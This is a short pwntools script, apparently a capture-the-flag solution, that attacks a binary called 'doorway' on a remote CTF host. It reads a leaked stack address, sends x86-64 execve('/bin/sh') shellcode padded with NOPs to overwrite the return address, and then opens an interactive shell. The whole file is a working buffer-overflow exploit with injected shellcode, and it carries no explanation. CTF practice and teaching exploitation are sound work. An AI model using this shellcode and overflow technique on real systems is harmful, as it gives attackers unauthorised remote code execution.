from pwn import *

exe = context.binary = ELF('./doorway', checksec=False)
host = "uithack.td.org.uit.no"
port = 9003

io = remote(host, port)
io.recvuntil(b"code: ")
leak = int(io.recvline().strip(), 16)
log.success(f"Leak @ {hex(leak)}")

io.recvuntil(b"> ")
payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(72, b"\x90")
payload += pack(leak)

io.sendline(payload)
io.interactive()

